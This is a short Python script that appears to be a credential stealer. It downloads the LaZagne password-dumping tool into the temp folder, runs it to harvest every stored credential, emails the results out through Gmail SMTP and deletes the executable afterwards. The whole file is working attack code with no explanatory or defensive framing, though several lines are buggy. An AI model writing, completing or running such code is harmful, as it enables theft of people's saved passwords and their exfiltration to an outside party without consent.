import requests
import subprocess
import smtplib
import os
import tempfile

lazagne: str
email: str
password: str


def download(url):
    filename = "laZagne.exe"
    get_response = requests.get(url)

    with open(filename, "wb") as outfile:
        outfile.write(get_response)


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 578)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


temp_dir = tempfile.gettempdir()
os.curdir(temp_dir)
download(lazagne)
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail(email, password, result)
os.remove("laZagne.exe")
